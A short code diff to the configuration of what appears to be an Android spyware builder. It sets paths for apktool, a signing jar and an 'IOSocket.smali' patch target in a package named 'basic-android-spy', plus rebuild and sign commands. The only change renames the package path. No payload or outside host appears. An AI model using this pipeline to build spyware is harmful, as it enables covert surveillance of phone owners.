@@ -15,7 +15,7 @@ exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
-exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/1cbyc-basic-android-spy/IOSocket.smali');
+exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/1cbyc/1cbyc-basic-android-spy/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
